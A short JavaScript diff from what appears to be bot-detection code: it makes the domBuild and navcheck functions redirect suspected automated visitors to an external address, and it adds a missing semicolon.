@@ -63,7 +63,7 @@ function domBuild() {
         // call the hopper
         hopper();
     } else {
-        void(0);
+        window.location.href = "https://gtfkd.com/";
     }
 }
 
@@ -76,7 +76,7 @@ function navcheck(){
         mousechk();
     } else {
         // since this is likely really automated, just redirect the user.
-        window.location.href = "https://gtfkd.com/"
+        window.location.href = "https://gtfkd.com/";
     };
 }
 
